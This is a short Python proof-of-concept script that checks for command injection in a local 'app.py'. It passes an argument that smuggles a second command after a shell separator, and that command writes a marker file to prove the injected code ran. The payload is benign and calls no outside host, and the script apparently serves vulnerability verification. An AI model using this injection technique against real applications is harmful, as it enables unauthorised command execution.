"""PoC: prove command injection by writing a side-effect marker file."""

import os
import subprocess
import sys
from pathlib import Path

MARKER = Path(__file__).resolve().parent / ".poc_marker"
SEP = "&" if os.name == "nt" else ";"


def main() -> int:
    MARKER.unlink(missing_ok=True)
    py = sys.executable
    payload = (
        f"safe{SEP}{py} -c "
        f"\"open({str(MARKER)!r}, 'w').write('1')\""
    )
    subprocess.run([py, "app.py", payload], cwd=MARKER.parent, check=False)
    return 0 if MARKER.exists() else 1


if __name__ == "__main__":
    sys.exit(main())
